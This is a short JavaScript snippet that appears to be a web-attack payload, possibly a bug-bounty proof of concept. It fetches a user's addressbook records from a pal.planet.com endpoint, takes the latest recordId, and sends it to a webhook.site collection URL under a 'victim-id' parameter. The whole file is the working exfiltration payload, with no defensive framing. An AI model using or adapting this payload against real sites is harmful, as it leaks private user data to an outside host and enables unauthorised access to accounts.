var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://pal.planet.com/addressbook:json?ts=1723140285535&start=0&limit=25&sort=&dir=&_=1723140285498', true);

xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
            // Parse the JSON response
            var response = JSON.parse(xhr.responseText);

            // Check if items array exists and has at least one item
            if (response.items && response.items.length > 0) {
                // Get the recordId of the latest item (last item in the array)
                var latestItem = response.items[response.items.length - 1];
                var latestRecordId = latestItem.recordId;

                // Log the recordId of the latest item
                console.log('Latest recordId:', latestRecordId);

                // Create a new XMLHttpRequest to send the latestRecordId as a parameter
                var xhr2 = new XMLHttpRequest();
                var targetUrl = 'https://webhook.site/5a2ec5dc-6d6d-4484-aff1-030fa01e4d0f/?victim-id=' + encodeURIComponent(latestRecordId);
                xhr2.open('GET', targetUrl, true);

                xhr2.onreadystatechange = function () {
                    if (xhr2.readyState === XMLHttpRequest.DONE) {
                        if (xhr2.status === 200) {
                            console.log('Successfully sent latestRecordId to the server.');
                        } else {
                            console.log('Failed to send latestRecordId with status:', xhr2.status);
                        }
                    }
                };

                // Send the request
                xhr2.send();
            } else {
                console.log('No items found in the response.');
            }
        } else {
            console.log('Request failed with status:', xhr.status);
        }
    }
};

xhr.send();
